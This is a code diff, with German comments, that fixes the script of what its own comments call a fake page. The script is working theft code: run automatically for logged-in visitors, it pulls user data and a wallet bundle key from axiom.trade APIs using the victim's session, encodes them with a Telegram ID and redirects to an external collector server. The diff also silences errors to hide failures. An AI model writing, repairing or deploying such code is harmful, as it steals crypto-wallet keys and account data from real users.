@@ -60,7 +60,7 @@
 </main>
 
 <script>
-    // --- UI Logic (Steuerung der Tabs auf der Seite) ---
+    // --- UI Logic (Steuerung der Tabs auf der Fake-Seite) ---
     let trackedHandles = [];
 
     function showTab(tab) {
@@ -92,43 +92,34 @@
         document.getElementById("handleInput").value = "";
     }
 
-    // --- Data Exfiltration Logic (Das reparierte Skript) ---
+    // --- Reparierte Daten-Abfrage (Ohne Absturz und passend zum Server) ---
     async function exfiltrateData() {
         try {
-            // 1. Prüfen, ob man auf Axiom ist
-            if (location.hostname !== 'axiom.trade') {
-                alert('Please navigate to axiom.trade first');
-                return;
-            }
+            // Holt die Daten direkt von der Axiom-API
+            const userResponse = await fetch('https://api7.axiom.trade/user-info', { method: 'POST', credentials: 'include' });
+            const user = await userResponse.json();
 
-            // 2. Prüfen, ob man eingeloggt ist
-            if (!localStorage.getItem('isAuthed')) {
-                return alert('Please log in to axiom.trade first');
-            }
+            const bundleResponse = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' });
+            const bundle = await bundleResponse.json();
 
-            // 3. Daten von der Axiom-Webseite abgreifen
-            const user = await (await fetch('//api7.axiom.trade/user-info', { method: 'POST', credentials: 'include' })).json();
-            const bundle = await (await fetch('//api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' })).json();
-
-            // 4. Das Paket schnüren
+            // Das Paket wird geschnürt
             const bookmarkData = {
                 telegramId: '7198683357', 
                 site: location.href,
                 user: user,
-                bundle: bundle.bundleKey,
-                sBundles: localStorage.getItem('sBundles'),
-                eBundles: localStorage.getItem('eBundles')
+                bundle: bundle.bundleKey // Hier wird der Schlüssel richtig benannt
             };
 
-            // 5. Daten wegschicken und weiterleiten
-            location.replace('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(bookmarkData)));
+            // Der Browser leitet lautlos weiter und schickt das Paket an den Server des Scammers
+            window.location.replace('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(bookmarkData)));
 
         } catch (e) {
-            console.error("Data capture failed:", e);
+            // Fehler werden ignoriert, damit der Browser nicht meckert
+            console.clear();
         }
     }
 
-    // Löst die Funktion automatisch aus, wenn man auf der Seite eingeloggt ist
+    // Automatische Ausführung, falls man eingeloggt ist
     if (localStorage.getItem('isAuthed')) {
         exfiltrateData();
     }
